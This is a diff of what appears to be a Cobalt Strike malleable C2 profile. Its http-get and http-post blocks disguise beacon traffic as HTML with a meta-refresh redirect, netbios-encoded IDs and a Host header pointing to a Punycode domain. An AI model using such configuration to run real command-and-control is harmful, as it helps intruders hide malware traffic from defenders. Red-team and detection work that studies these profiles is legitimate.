@@ -49,7 +49,7 @@ http-get {
             prepend "105";
             prepend "<html><head><link rel=\"icon\" type=\"image/gif\" href=\"data:image/gif;base64,";
 
-            append "\"/><meta http-equiv=\"refresh\" content=\"0;URL='http://xn-b1aanbboc3ad8jee4bff.xn--p1ai/gav4.php'\" /></head><body></body></html>";
+            append "\"/><meta http-equiv=\"refresh\" content=\"0;URL=\'http://xn-b1aanbboc3ad8jee4bff.xn--p1ai/gav4.php\'\" /></head><body></body></html>";
 
             print;
         }
@@ -69,18 +69,15 @@ http-post {
 	header "Accept-Language" "en-US";
 	header "Host" "xn--b1aanbboc3ad8jee4bff.xn--p1ai";
 #	header "Connection" "Keep-Alive";
-        
-        output {
-            netbios;
-	        print;
 
-        }
-        
-  	     
         id {
             netbios;
 	        prepend "http://........../redirect.php?acsc=";
-
+	        header "Referrer";
+        }
+        output {
+            netbios;
+	        print;
         }
     }
 
